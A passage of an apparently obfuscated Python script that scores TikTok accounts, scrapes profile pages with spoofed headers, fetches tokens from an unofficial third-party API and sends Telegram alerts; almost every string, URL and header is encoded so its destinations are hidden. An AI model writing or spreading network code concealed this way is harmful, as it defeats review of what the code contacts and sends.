[str(v.get(__sx__(b\'bc9eOVrYWJjaWRQVG6IWKQ==\', 21)) or v.get(__sx__(b\'kDIjpOno6dDoJg==\', 232)) or v.get(__sx__(b\'fN5PKEvJSfFIBQQPTga5\', 4))) for v in vids if v.get(__sx__(b\'VPZnAGPhYaHjYC0sIpsvEA==\', 44)) or v.get(__sx__(b\'/F5PyIWEhbyESg==\', 132))]\n    except:\n        pass\n    return []\n\ndef _confirmed_by_rounds(username, claimed_diff):\n    rounds_ok = 0\n    for _ in range(CONFIRM_ROUNDS):\n        ok_sources = 0\n        counts = []\n        tf = _fetch_video_count_tikfans(username)\n        tw = _fetch_video_count_tikwm(username)\n        th = _fetch_video_count_html(username)\n        for v in (tf, tw, th):\n            if isinstance(v, int):\n                counts.append(v)\n        if len(counts) >= CROSS_SOURCES_REQUIRED:\n            max_v = max(counts)\n            min_v = min(counts)\n            if max_v - min_v <= max(1, int(claimed_diff)):\n                ok_sources += CROSS_SOURCES_REQUIRED\n        else:\n            ok_sources += len(counts)\n        ids_now = _fetch_recent_aweme_ids(username, count=40)\n        time.sleep(max(0.5, REFRESH_DELAY_SEC / 2))\n        ids_later = _fetch_recent_aweme_ids(username, count=40)\n        if ids_now and ids_later and (ids_now != ids_later):\n            ok_sources += 1\n        if ok_sources >= CROSS_SOURCES_REQUIRED:\n            rounds_ok += 1\n        else:\n            time.sleep(REFRESH_DELAY_SEC)\n    return rounds_ok >= CONFIRM_ROUNDS\n\ndef _deletion_worker():\n    while True:\n        try:\n            payload = _DELETION_QUEUE.get()\n            if not payload:\n                continue\n            username = payload[__sx__(b\'8FKjpcalQsNExY2Ihw+L6Q==\', 136)]\n            claimed_diff = int(payload[__sx__(b\'2Hrraezro6CkoaE6\', 160)])\n            msg = payload[__sx__(b\'w2FwlvW8u7ksuvM=\', 187)]\n            key = f\'{username}|-{claimed_diff}\'\n            if key in _LAST_SENT_KEY:\n                continue\n            if _confirmed_by_rounds(username, claimed_diff):\n                _LAST_SENT_KEY.add(key)\n                _send_telegram_raw(msg)\n        except Exception:\n            pass\n        finally:\n            _DELETION_QUEUE.task_done()\nthreading.Thread(target=_deletion_worker, daemon=True).start()\n\ndef send_telegram_alert(message):\n    __sx__(b\'ELJd5yVi6jh0rJ/1itdE4EY5bip3CIZV481N3oJiKdV6qsxKtBzm8bNc1oBF7BGmlA42pxzQq3WmiPDJuZ/rrjDKKkP5W1uOACXXdhhQI4vuUzt3CEIPpfrtQGb9iepPX/WBTbVY39Y07XAkuZqoBFiEkb4qPq9doxebd0fK7DpKHrXaicHDg6Bv1ZOgBT+9yl5XnMVh8cWKQHSvoUzwbRnQNEyLjQpyLht7JYe5fvdVldLSzjxDcoaJFoBHv4fJaA==\', 104)\n    if STRICT_DELETION_CONFIRM:\n        try:\n            m = _DEL_ALERT_RE.match(message.strip())\n            if m:\n                username = m.group(1)\n                diff = 1\n                _DELETION_QUEUE.put({__sx__(b\'W/kIDm0O6WjvbiYjLKQgQg==\', 35): username, __sx__(b\'tBaHBYCHz8zIzc1W\', 204): diff, __sx__(b\'mTsqzK/m4eN24Kk=\', 225): message})\n                return\n        except:\n            pass\n    _send_telegram_raw(message)\n\ndef \xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd9\x82\xd9\x88\xd8\xa9_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8(f, l, v):\n    try:\n        f, l, v = (int(f), int(l), int(v))\n        score = 0\n        score += min(f / 1000, 30)\n        score += min(l / 5000, 30)\n        score += min(v * 2, 20)\n        if f > 100000 and l > 100000 and (v > 30):\n            score += 20\n        return min(int(score), 100)\n    except:\n        return 0\nEU_SET = {__sx__(b\'pwWsrtrf3xDfVQ==\', 223), __sx__(b\'wWPKsru5uVm5IA==\', 185), __sx__(b\'7U9mZpSVlX+VDg==\', 149), __sx__(b\'FrQdHGtubqVu5g==\', 110), __sx__(b\'mzkQ7+Lj4wvjfQ==\', 227), __sx__(b\'23nQrqWjo3yjOg==\', 163), __sx__(b\'rA7f3NXU1CLUcQ==\', 212), __sx__(b\'+liJ9IeCgm+CGw==\', 130), __sx__(b\'z21ERLC3t1q3KQ==\', 183), __sx__(b\'Ppw1t0BGRpNG1g==\', 70), __sx__(b\'4ELra5yYmE+YCA==\', 152), __sx__(b\'FLYfG25sbL5s5g==\', 108), __sx__(b\'lTcemejt7TTtYg==\', 237), __sx__(b\'qgih3tPS0grSRA==\', 210), __sx__(b\'UvBZ3CoqKvoqpg==\', 42), __sx__(b\'z228R7a3t1m3Kg==\', 183), __sx__(b\'NJY/wk5MTK5M0g==\', 76), __sx__(b\'ymi5RLSyskGyLQ==\', 178), __sx__(b\'1XdepaitrUqtMw==\', 173), __sx__(b\'yWu6Q7axsUSxEw==\', 177), __sx__(b\'pgStrNne3hPeVA==\', 222), __sx__(b\'IYMqVltZWbtZww==\', 89), __sx__(b\'7U9mnZeVlXGVDg==\', 149), __sx__(b\'5EaXlpqcnGWcOg==\', 156), __sx__(b\'P51MMkNHR6pH0A==\', 71)}\n\ndef \xd8\xaa\xd8\xad\xd9\x84\xd9\x8a\xd9\x84_\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd9\x85\xd8\xaa\xd9\x82\xd8\xaf\xd9\x85(followers_val, likes_val, videos_val, region_code, bio_text):\n    engagement = round(likes_val / followers_val * 100, 2) if followers_val > 0 else 0.0\n    tier_follow = __sx__(b\'hCYHzIM2snnnp5MQRiWJn9/8wtP19A==\', 252) if followers_val < 1000 else __sx__(b\'nz0c15gtkWJ8StCxOgtfVh4hkee3k+2x\', 231) if followers_val < 10000 else __sx__(b\'+lh5sv18sAcZT7XUXm44M5OCvriKPw==\', 130) if followers_val < 100000 else __sx__(b\'nz0c15gZzWL8PIlLXD7t58tw4Iw=\', 231)\n    tier_videos = __sx__(b\'X/3cF5hAhOWqEhDx+MudljknGigvxQ==\', 39) if videos_val < 10 else __sx__(b\'owEg62S8ZBkWbcAQtG0FN97b55nTRg==\', 219) if videos_val < 50 else __sx__(b\'331clxjAFGVqEbxsyMseFrqnm9yvTw==\', 167) if videos_val < 200 else __sx__(b\'FrSVXtEJnWlOONa3Eg2bo8D1424JwGU3\', 110)\n    extra = 0\n    if engagement >= 10:\n        extra += 15\n    elif engagement >= 5:\n        extra += 10\n    elif engagement >= 2:\n        extra += 6\n    elif engagement >= 1:\n        extra += 3\n    if bio_text and len(bio_text.strip()) >= 6:\n        extra += 4\n    if (region_code or __sx__(b\'c9EICwsLCwo=\', 11)).upper() in EU_SET:\n        extra += 6\n    extra = min(extra, 25)\n    base = \xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd9\x82\xd9\x88\xd8\xa9_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8(followers_val, likes_val, videos_val)\n    final_score = min(base + extra, 100)\n    if final_score >= 80:\n        label = __sx__(b\'sxHK4cseNDtUX1vrEkkSQxJB6xNnE2QSQBNs6ylLWOsTfhNyE2PrE2wSTxNmE3MTevaG0KU=\', 203)\n        color = GREEN\n    elif final_score >= 50:\n        label = __sx__(b\'13WuiK93UE01D0AXII92KncFdid3HHcYj00vPI92JXcCdwV3CHcDj3cZdxV3GKj+tZA=\', 175)\n        color = YELLOW\n    else:\n        label = __sx__(b\'mDrhw+A8HxB/ekvAOFY4WTlqOWHAAmBzwDhTOWc5ZMA4RzlkOE04WDhRdZT2CA==\', 224)\n        color = RED\n    badges = []\n    if engagement >= 10:\n        badges.append(__sx__(b\'kTPo8ekOFhl2fUzJMUMwaDFOMVAwbckxUDFOMG0wYyGH+cs=\', 233))\n    if followers_val >= 10000:\n        badges.append(__sx__(b\'y2myrrNRTEMsPARcCzyTax9qNmo0ajtrApNqNmsKaxlrG2sClF6gQQ==\', 179))\n    if videos_val >= 50:\n        badges.append(__sx__(b\'6EproC//TmuNbZqny/88LSF69ldd3pWwQegje1bWkG2UgpE=\', 144))\n    if (region_code or __sx__(b\'3nylpqampqc=\', 166)).upper() in EU_SET:\n        badges.append(__sx__(b\'LY+uZeoogNKsuO5BO3nrjCQ2dkX67YxQVcheWw8=\', 85))\n    if bio_text and len(bio_text.strip()) >= 6:\n        badges.append(__sx__(b\'331cl9hV+yK8jMmLGH7SFORGwUwq8pA8JjtxPIqnQZ+2ng==\', 167))\n    if not badges:\n        badges.append(__sx__(b\'qwko46wqmVZIjuQFDYumsCpe5tmTuSge3XMTldM9BsI4\', 211))\n    return {__sx__(b\'wGLzdfP39Pd19XWTubiu97yk\', 184): engagement, __sx__(b\'DK5fvThZ/ju/u729W3N0b9tw0w==\', 116): tier_follow, __sx__(b\'hyXUNrPSddA0s7Yy0Pn/5Ef7YQ==\', 255): tier_videos, __sx__(b\'RuR19fJ18rcRcPARdDs+JMI6uA==\', 62): final_score, __sx__(b\'ZMbXVVBW0R0cGh0eHQ==\', 28): label, __sx__(b\'L42cHhsdmt4YmZieeFVXTddTKA==\', 87): color, __sx__(b\'C6k4OT86PF51c3tKcRQ=\', 115): badges}\n\ndef \xd8\xb4\xd8\xb1\xd9\x8a\xd8\xb7_\xd9\x82\xd9\x88\xd8\xa9(score):\n    bars = int(score / 10)\n    return f"{\'\xe2\x96\x88\' * bars}{\'\xe2\x96\x91\' * (10 - bars)}"\nURL_TOKEN = __sx__(b\'3X+gZGSoJZWtoHUob2Q+5t3WJeOst86EQI5MUxvSpLuO9MOzlDZjcJBvxKpMbLgvrBbTjk3+zdU+f2BOZQH1TArKOd5VXaRZu7nx\', 165)\nPARAMS_TOKEN = {__sx__(b\'MZOCB+RNSUvOSAM=\', 73): __sx__(b\'a8lg579ZH71nnznfvt/i52QmWhjfXiA7W94+Xlwl2WfhIyU9GV3m3l0UEwYdHqM=\', 19)}\nPAYLOAD_TOKEN = json.dumps({__sx__(b\'1nSF5IOHg2Sl4OOAg+SjZ2HgY62u7ryppw==\', 174): True})\nHEADERS_TOKEN = {__sx__(b\'xWe2kPOQb8jx8nCWvL2ppr4B\', 189): __sx__(b\'TO7/+/ocHR3kA+IHAOYHMDQUpDfZ\', 52), __sx__(b\'T+1Ee3l5Gh/mQvp8+Xj++3wwNxyaMpI=\', 55): __sx__(b\'shCBZQDmysrOmstx\', 202), __sx__(b\'I4EolZRwEpZwilbydxNeW0VDX/A=\', 91): __sx__(b\'xmT1kpZ2d/LwkndycW1xlHBxvb6JyrjA\', 190), __sx__(b\'GLrLsC2uqSytS7FNK01KrqyvY2BUKWY4\', 96): __sx__(b\'tBbHhoGA4j2H4AXghxk75roC44YZ+xt/HP8YuwfghoGG4ILJxSVaa+rNzOcMwvc=\', 204)}\nURL_USERINFO = __sx__(b\'RuQ7/180vh4yOO4tc7euniXK4TAeCHWqc+LZw0XRPbij4BGd8rynxHiWkxoPJG0hdEU2ufVj6W2oWmorTfzOER3oKIvj+M2snAEv7SXh\', 62)\nAR_COUNTRY = {__sx__(b\'hiSNj/v+/jH+dA==\', 254): __sx__(b\'vhx9dz6gDQsQ3Q2pcBsqfHfaxo1EzzE=\', 198), __sx__(b\'AqAJcXh6epp64w==\', 122): __sx__(b\'+lg5W/rhYU80mRntroWCqqqFzw==\', 130), __sx__(b\'DqyFhXd2dpx27Q==\', 118): __sx__(b\'y2kIas0AUNV4fgWoWNyftLOEkLs3\', 179), __sx__(b\'yGrDwrWwsHuwOA==\', 176): __sx__(b\'xWcGDF/bdjCIigbTi2Lls72Ev7Ud\', 189), __sx__(b\'5kRtkp+ennaeAA==\', 158): __sx__(b\'sBJzeTyuH0Ul/14XpMkaA8mFRMLm\', 200), __sx__(b\'e9lwDgUDA9wDmg==\', 3): __sx__(b\'mzlYUhclBfjIjc9cOpVQCCWR460l6ao=\', 227), __sx__(b\'S+k4OzIzM8Uzlg==\', 51): __sx__(b\'+lg5M37kSQ+XtbRc2vfhVY+imYLnDYlU\', 130), __sx__(b\'bM4fYhEUFPkUjQ==\', 20): __sx__(b\'cdOyuPVvwoTEPjJnf9RRBgkwMgG6\', 9), __sx__(b\'hiQNDfn+/hP+YA==\', 254): __sx__(b\'njxdVxqALStQ/f2JkDoKXFfg5qry7Os=\', 230), __sx__(b\'23nQUqWjo3ajMw==\', 163): __sx__(b\'Opj5874kic+3ddSdLvmbOCG7z8912UM/eU9G\', 66), __sx__(b\'1XfeXqmtrXqtPQ==\', 173): __sx__(b\'JYfmhCXusDuWkOtGtjJxWl1rklUh\', 93), __sx__(b\'fN53cwYEBNYEjg==\', 4): __sx__(b\'eti5s/5kyc9UIm67235hp8APMvXEqBlpba69sxACLuQWPg==\', 2), __sx__(b\'shA5vs/KyhPKRQ==\', 202): __sx__(b\'VvSVn9pI+aOjGXVAmPN2UU0XLmLwJAI=\', 46), __sx__(b\'6kjhnpOSkkqSBA==\', 146): __sx__(b\'lTdWXBGLJiBbdkDa2zK14+3VheVJ\', 237), __sx__(b\'2njRVKKionKiLg==\', 162): __sx__(b\'uxl4cjqlBA5t2Fisr39y38P5xcsg\', 195), __sx__(b\'qQvaIdDR0T/RTA==\', 209): __sx__(b\'hyVETh2ZODJpZJLIKSCn8f/Hffdb\', 255), __sx__(b\'SOpDvjIwMNIwrg==\', 48): __sx__(b\'B6XEzoMZtPIqSMmjk8Wmc39G13fV\', 127), __sx__(b\'PpxNsEBGRrVG2Q==\', 70): __sx__(b\'SeuKgMhX+vy/qrwGp+5dj+hEUggxUMQ6UA==\', 49), __sx__(b\'N5W8R0pPT6hP0Q==\', 79): __sx__(b\'NJb3/bAqh4GaVyciIEhMZH1LBA==\', 76), __sx__(b\'zW++R7K1tUC1Fw==\', 181): __sx__(b\'QeOCiMhf/vTvIvJWj+TVg4glOXVdMzA=\', 57), __sx__(b\'XP5XViMkJOkkrg==\', 36): __sx__(b\'oQNiaDu/ElSE7k8GAaFqMh+r2Ze+04M=\', 217), __sx__(b\'njyV6eTm5gTmfA==\', 230): __sx__(b\'jS9ORAmTPjhbbujCLpvZSizz9b6z/Cs=\', 245), __sx__(b\'QOLLMDo4ONw4ow==\', 56): __sx__(b\'wWMCYMXaWnQ3onLWFQNgzNqAufUls5M=\', 185), __sx__(b\'W/koKSUjI9ojhQ==\', 35): __sx__(b\'uBp7cTUGBtvrrrYdmM7A6t/HuQ==\', 192), __sx__(b\'vhzNs8LGxivGUQ==\', 198): __sx__(b\'3nwdF17AYWtAvb3Jihl/0BVNYNSmxBGtJA==\', 166), __sx__(b\'mDrr6eLg4BzgRw==\', 224): __sx__(b\'YcOiqPPf34LULqJ3NR4ZMBAeUw==\', 25), __sx__(b\'ftwNCwAGBvkGrw==\', 6): __sx__(b\'qAprYSy2Gx1eS/3nRg88amEsFvpVy/BRBst7vnxtYS4WmtCN3cU3\', 208), __sx__(b\'2HrT1qSgoGmgJQ==\', 160): __sx__(b\'ROaH5UCP0frGJ/c9JeE5/g==\', 60), __sx__(b\'cdN6fQwJCcAJjg==\', 9): __sx__(b\'4EIjKWT+UxU9r8P3tCcpiRDPsUSYkXSc6s5EdCIpilSdUjYiKW5eYoOzmZhcuDw=\', 152)}\n\ndef arabic_country_name(region_code):\n    if not region_code:\n        return __sx__(b\'I4Hg6rA9jNbWUWwANLfn6qo9nJYdWzDBUIk=\', 91)\n    code = region_code.upper()\n    if code in AR_COUNTRY:\n        return AR_COUNTRY[code]\n    if pycountry:\n        try:\n            country = pycountry.countries.lookup(code)\n            return country.name\n        except Exception:\n            pass\n    return f\'\xd8\xba\xd9\x8a\xd8\xb1 \xd9\x85\xd8\xb9\xd8\xb1\xd9\x88\xd9\x81 ({code})\'\n\ndef flag_from_region(region_code):\n    if not region_code or len(region_code) != 2:\n        return __sx__(b\'ELITXB9aaGweans=\', 104)\n    try:\n        return __sx__(b\'aMoTEBAQEBE=\', 16).join([chr(127397 + ord(c.upper())) for c in region_code])\n    except:\n        return __sx__(b\'TO5PAEMGNDBCNic=\', 52)\n\ndef get_id_token():\n    r = requests.post(URL_TOKEN, params=PARAMS_TOKEN, data=PAYLOAD_TOKEN, headers=HEADERS_TOKEN, timeout=15)\n    r.raise_for_status()\n    tok = r.json().get(__sx__(b\'T+38ez7++Hn6NDc8IDX4\', 55))\n    if not tok:\n        raise Exception(__sx__(b\'NJZNfEyDs5TmlPWU/JT9bJTmlcSVyJXGlONsJSgYIycpImyVyZXKbAsjIysgKWwFKCkiOCU4NfBaVW0=\', 76))\n    return tok\n\ndef fetch_userinfo_tikfans(username, bearer_token=None):\n    if not bearer_token:\n        bearer_token = get_id_token()\n    payload_user = json.dumps({__sx__(b\'iCq7udy59PD08PFr\', 240): {__sx__(b\'rgz9+5j7HJ0am9PW2VHVtw==\', 214): username}})\n    headers_user = {__sx__(b\'OphJbwxvkDcODY9pQ0JWWUH+\', 66): __sx__(b\'/V9OSkutrKxVslO2sVe2gYWlFYZo\', 133), __sx__(b\'3nzV6ujoi45302vtaOlvau2hpo0LowM=\', 166): __sx__(b\'pgSVcRTy3t7ajt9l\', 222), __sx__(b\'thS9AAHlhwPlH8Nn4obLztDWymU=\', 206): __sx__(b\'oAKT9PAQEZSW9BEUFwsX8hYX29jvrN6m\', 216), __sx__(b\'1XfmgYBkZYJnAeeBZGFirq2LXag/\', 173): f\'Bearer {bearer_token}\'}\n    r = requests.post(URL_USERINFO, data=payload_user, headers=headers_user, timeout=25)\n    if r.status_code in (401, 403):\n        bearer_token = get_id_token()\n        headers_user[__sx__(b\'pwWU8/IWF/AVc5XzFhMQ3N/5L9pN\', 223)] = f\'Bearer {bearer_token}\'\n        r = requests.post(URL_USERINFO, data=payload_user, headers=headers_user, timeout=25)\n    r.raise_for_status()\n    data = r.json()\n    result = data.get(__sx__(b\'GLpLKk1OrUlhYGlCYsA=\', 96), {}) or data\n    info = {__sx__(b\'7028utm6Xdxb2pKXmBCU9g==\', 151): username, __sx__(b\'xmSV8POwc/K/vrbMvOA=\', 190): result.get(__sx__(b\'TO4fenk6+Xg1NDxGNmo=\', 52)) or result.get(__sx__(b\'FbdGIyDjQqAhbG1m52+w\', 109)) or __sx__(b\'xmS9vr6+vr8=\', 190), __sx__(b\'T+0cGnkaxXs2Nz/UNVo=\', 55): result.get(__sx__(b\'Xf8OCGsI12kkJS3GJ0g=\', 37)) or result.get(__sx__(b\'Dqy9Ond2d052uA==\', 118)) or __sx__(b\'WPojICAgICE=\', 32), __sx__(b\'R+X09HPx8XTzcjo/MeU8eA==\', 63): result.get(__sx__(b\'oQMSEpUXL5IVlNzZ14Pa/g==\', 217)) or result.get(__sx__(b\'ogAREZYUFJEWl9/a1ADZnQ==\', 218)) or __sx__(b\'SOozMDAwMDE=\', 48), __sx__(b\'2niJ6O9tbm2hoqpsoCc=\', 162): (result.get(__sx__(b\'kjDBoKclJiXp6uIk6G8=\', 234)) or result.get(__sx__(b\'6ErbXr9du7k6lJCcgJOF\', 144)) or __sx__(b\'aMoTEBAQEBE=\', 16)).upper(), __sx__(b\'WfsK723uag0IDGskITI/IvI=\', 33): result.get(__sx__(b\'1HaHYuBj54CFgeaprL+yr38=\', 172)) or __sx__(b\'V/WU9l1Mlu3igbQyGPnzdyAvExAn4w==\', 47), __sx__(b\'f91MzMjOzihIKnXJKMosBgchFAJz\', 7): int(result.get(__sx__(b\'vR+Ojgnuw8XBy8Rs\', 197)) or result.get(__sx__(b\'shCBAQUDA+WF57gE5Qfhy8rs2c++\', 202)) or 0), __sx__(b\'JIZ3lxAVkSuSc5F3XVxK0lh9\', 92): int(result.get(__sx__(b\'/12sTMvOSoCHgduFnw==\', 135)) or result.get(__sx__(b\'W/kI6G9q7lTtDO4IIiM1rScC\', 35)) or 0), __sx__(b\'YsDRUlc2MGvUNdcxGxoMJR4E\', 26): int(result.get(__sx__(b\'e9nIS04vKQIDBR8BFg==\', 3)) or result.get(__sx__(b\'giAxsrfW0Is01TfR+/rsxf7k\', 250)) or 0)}\n    return (info, bearer_token)\n\ndef _extract_value(source, regex, default_value=__sx__(b\'jy309/f39/Y=\', 247)):\n    m = re.search(regex, source)\n    return m.group(1) if m else default_value\n\ndef fetch_page_enrichment(username):\n    __sx__(b\'/V+wC0iMR8WVAGos5681kT51L6id8yZO28E1hhTIx8HhlqAYOfIwl1rDGU5Ffnzjr1a1dwG+l4Y45CXC7um1Vs7sFVWe6/2s1bYnFkIG5Oco1+JtUPLggD/QMIW4Fy0doLP9XQcPuZ/fCfFgT5DcZUntGnjA/ZRAnuAsckEFXFM+aENPyvpdHmLXyNe3Btd88muOJQfy9Q==\', 133)\n    try:\n        u = username.strip(__sx__(b\'tBa/zMzMjcyN\', 204))\n        url = f\'https://www.tiktok.com/@{u}\'\n        headers = {__sx__(b\'6khhWr28k5KRWZMN\', 146): __sx__(b\'pAb38/ML9xUQ8hUTCpcSE9nc9h/ZSw==\', 220), __sx__(b\'txXkgYIZggEf4oLLz9+vzPg=\', 207): __sx__(b\'4UPKy2lStsjpLe+z01XSyCu3KswrLc1LyMnrV7FTVlS1VNyL61ZW1lbQzJlSPVtdmNRVi90=\', 153), __sx__(b\'mDrLrq02rS4wza00LS2vKiyp5eDQNeU8\', 224): __sx__(b\'cNK7PwwICLkIeQ==\', 8), __sx__(b\'asg5XF/EX9zCP1/GP9pbPlvZPdgXEiwKFNs=\', 18): __sx__(b\'GbsyE60qSKuuLTBjYW/ZYmc=\', 97), __sx__(b\'kzHAxqPEoaeiPiYnwKWmxcahPsahxsemxsXC7etp/OH2\', 235): __sx__(b\'rQ/m0dXV59Xn\', 213), __sx__(b\'MpBhZwRnmAcGBYdhS0pfsUm2\', 74): __sx__(b\'CKpduzF78kBodpDPgm5lEuPsRYFUbXqsUFiYTIP7TowEQmLSLy/37ouTk/c18t4k8byBzM5rxIPgUn/A2iA188PcY7EdA8S7UgTTzpPn3rrNWge4yqOly330N7LhnhO8AQjWSOHem69HpmgVXQycKXjngHj5j4l7asVUEA==\', 112), __sx__(b\'DK4/ODo6WVx1dHw+dgU=\', 116): __sx__(b\'qwmOHxjZU/PDVjIk4hhznvLtH7tA3nvKWiorAr6CaBAUMpyLQUtApM+xp7fzAsGX6nb5rCadfXm+1Z3N/9kb5+6glM6MXhKh9QumPuxSXr8TYhWxtdvFtoVpaFjU6Kfj8w==\', 211), __sx__(b\'/V+uy8hTyM6ozEtVqEupzICFogqA0A==\', 133): __sx__(b\'ymh5eX35t7K2+LMD\', 178), __sx__(b\'ELJDJiW+JSNFIaa4paUnIW1oTwFtLQ==\', 104): __sx__(b\'xmR19ZJ18vGS97u+sEK97g==\', 190), __sx__(b\'QOITdnXudXMVcfboFRV2FTo4H5w9Zw==\', 56): __sx__(b\'ctC5PQ4KCrsKew==\', 10), __sx__(b\'pwX0kZIJkpTylhEPkpby8d7f+Ivajw==\', 223): __sx__(b\'0nDhY+WEZ+dngauqpFWpyg==\', 170), __sx__(b\'7kzd2tjYu75HW99a3bnb2tmTlrg2k3Q=\', 150): __sx__(b\'lTemID7g4DukIF7DWdg9XuntzHzpxQ==\', 237)}\n        resp = requests.get(url, headers=headers, timeout=20)\n        if resp.status_code != 200:\n            return None\n        content = resp.text\n        try:\n            block = content.split(__sx__(b\'MJJjBwUCZGCYY2UGZZoFAWUBhIQZSkgCMk9n\', 72))[1].split(__sx__(b\'lTe+56egIyIgoCCm5MCjwB8kwcO87+2ryur3\', 237))[0]\n        except IndexError:\n            return None\n        enriched = {__sx__(b\'6ErbW19ZWb9fXNvnXr9du5GQu3yVSw==\', 144): _extract_value(block, __sx__(b\'U/Fg4OTi4gTk52Bc5QTmAHqZ+aNi+v0vK3A9LFg=\', 43), __sx__(b\'zmyFtra2h7aH\', 182)), __sx__(b\'yGqb+516/Hv8/bGwv4Wz/w==\', 176): __sx__(b\'0XMi5YSvqaviqJs=\', 169) if __sx__(b\'AaMqUzJUszWyNTQoy1NQUzR8eVIIfPQ=\', 121) in block else __sx__(b\'RuTN9Tk+PzM+gA==\', 62), __sx__(b\'IoBxkpaRERdTkRYTl60WW1p+rV95\', 90): _extract_value(block, __sx__(b\'wGLrknB0c/P1sXP08XXvChLucvTpCupqMDbrMm1uvLgwRLAo\', 184), __sx__(b\'x2VMdHD0ur+8db4u\', 191)), __sx__(b\'ljTFoKPgI6Lv7uac7LA=\', 238): _extract_value(block, __sx__(b\'IoBxFBdUlxYL6AiI0tQJ0I+MXlpx4F7K\', 90), __sx__(b\'2nihoqKioqM=\', 162)), __sx__(b\'etgpL0wv8E4DAgrhAG8=\', 2): _extract_value(block, __sx__(b\'ddfGQVy/X9+FRNzbCQ0D8A+F\', 13), __sx__(b\'TO43NDQ0NDU=\', 52)), __sx__(b\'dtQlREPBwsENDgbADIs=\', 14): _extract_value(block, __sx__(b\'WfsKa2zu7e5yk3Pzqa9yq/T3JSEMvSWW\', 33), __sx__(b\'xmS9vr6+vr8=\', 190)).upper()}\n        ts = _extract_value(content, __sx__(b\'40HI0bXR1rfSllJX1s4pSRPSSk2fm6F5niU=\', 155), __sx__(b\'F7Vsb29vb24=\', 111))\n        if ts.isdigit():\n            dt = datetime.datetime.utcfromtimestamp(int(ts))\n            enriched[__sx__(b\'O5kIbQkObwpOio8OTk4yRUNnaUez\', 67)] = dt.strftime(__sx__(b\'JoQN04oLk4sLEw8Oq+4Mq+sMU1hefOldgQ==\', 94))\n            enriched[__sx__(b\'zW/+m//4mfxAfZqYt7WjhrGm\', 181)] = dt.hour\n            enriched[__sx__(b\'uBqL7oqN7Ik1DQzr7YnFwN9TxCc=\', 192)] = dt.minute\n            enriched[__sx__(b\'cNJDJkJFJEEFRkXGx0MJCBdQDNk=\', 8)] = dt.second\n        else:\n            enriched[__sx__(b\'40HQtdHWt9KWUlfWlpbqnZu/sZ9r\', 155)] = __sx__(b\'etjxyS1Tcsktz0kDAg3mAUw=\', 2)\n        if enriched.get(__sx__(b\'JIZ3FhGTkJNfXFSSXtk=\', 92)):\n            if pycountry:\n                try:\n                    country = pycountry.countries.lookup(enriched[__sx__(b\'NpRlBAOBgoFNTkaATMs=\', 78)])\n                    enriched[__sx__(b\'pwWUEfAS9PZ1K5QTktrfxCHbSQ==\', 223)] = country.name\n                except Exception:\n                    enriched[__sx__(b\'QuBx9BX3EROQznH2dz86IcQ+rA==\', 58)] = __sx__(b\'Bad2sLaztlKyfn12G3+M\', 125)\n            else:\n                enriched[__sx__(b\'vx2MCegK7O5tM4wLisLH3DnDUQ==\', 199)] = __sx__(b\'b80c2tzZ3DjYFBcccRXm\', 23)\n        else:\n            enriched[__sx__(b\'Cqg5vF2/WVvYhjm+P3dyaYx25A==\', 114)] = __sx__(b\'Wvgp7+ns6Q3tISIpRCDT\', 34)\n        return enriched\n    except Exception:\n        return None\n\ndef \xd8\xa7\xd8\xad\xd8\xb5\xd9\x84_\xd8\xb9\xd9\x84\xd9\x89_\xd8\xa8\xd9\x84\xd8\xaf_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8_\xd8\xad\xd9\x82\xd9\x8a\xd9\x82\xd9\x8a(username, info):\n    __sx__(b\'etgvjDMIwGIOh/WcIFnvIOrqA8ZDtWzQw0OnCi/qC65vK4zcwuttCVimiFV7Wz+LrX0ZCi0jLV3gCkExz/PXRlJoiERiKg22MiqFRBG/dDtxxsTG4RQ/RAmMKdMGLdjtLo3ZfxpFFCj66pusSFJx/dBLQxsv/tfQGQ2uK1urFEDpWVH75zXjPS9oPtNqJGO2idVsjXcB+RLNGzmxVf7yMt1GpZz1BTvhb2s=\', 2)\n    enriched = fetch_page_enrichment(username)\n    region_code = __sx__(b\'vB7HxMTExMU=\', 196)\n    if enriched and enriched.get(__sx__(b\'EbNCIySmpaZqaWGna+w=\', 105)):\n        region_code = enriched[__sx__(b\'332M7epoa2ikp69ppSI=\', 167)].upper()\n    else:\n        region_code = (info.get(__sx__(b\'yWua+/x+fX6ysbl/szQ=\', 177)) or __sx__(b\'ZsQdHh4eHh8=\', 30)).upper()\n    country_ar = arabic_country_name(region_code)\n    flag = flag_from_region(region_code)\n    return (region_code, country_ar, flag, enriched)\n\ndef \xd8\xa7\xd8\xb7\xd8\xa8\xd8\xb9_\xd8\xa8\xd8\xb7\xd8\xa7\xd9\x82\xd8\xa9_\xd8\xa7\xd9\x84\xd8\xad\xd8\xb3\xd8\xa7\xd8\xa8(g, nickname, country_ar, flag, bio, followers, likes, videos, analysis, enriched=None):\n    border = f"{MAG}{\'\xe2\x95\x90\' * 58}{RESET}"\n    title = f"{BOLD}{CYAN}\xf0\x9f\x91\xa4 @{g} \xe2\x80\x94 {(nickname if nickname else \'\xd8\xa8\xd8\xaf\xd9\x88\xd9\x86 \xd8\xa7\xd8\xb3\xd9\x85\')}{RESET}"\n    line1 = f\'{WHITE}\xf0\x9f\x93\x8d \xd8\xa7\xd9\x84\xd8\xaf\xd9\x88\xd9\x84\xd8\xa9: {country_ar} {flag}{RESET}\'\n    line2 = f\'{WHITE}\xf0\x9f\x91\xa5 \xd8\xa7\xd9\x84\xd9\x85\xd8\xaa\xd8\xa7\xd8\xa8\xd8\xb9\xd9\x88\xd9\x86: {followers:,}   \xe2\x9d\xa4\xef\xb8\x8f \xd8\xa7\xd9\x84\xd8\xa5\xd8\xb9\xd8\xac\xd8\xa7\xd8\xa8\xd8\xa7\xd8\xaa: {likes:,}   \xf0\x9f\x93\xb9 \xd8\xa7\xd9\x84\xd9\x81\xd9\x8a\xd8\xaf\xd9\x8a\xd9\x88\xd9\x87\xd8\xa7\xd8\xaa: {videos:,}{RESET}\'\n    line3 = f\'{WHITE}\xf0\x9f\x93\x9d \xd8\xa7\xd9\x84\xd8\xa8\xd8\xa7\xd9\x8a\xd9\x88: {bio}{RESET}\'\n    score = analysis[__sx__(b\'B6U0tLM0s/ZQMbFQNXp/ZYN7+Q==\', 127)]\n    bar = 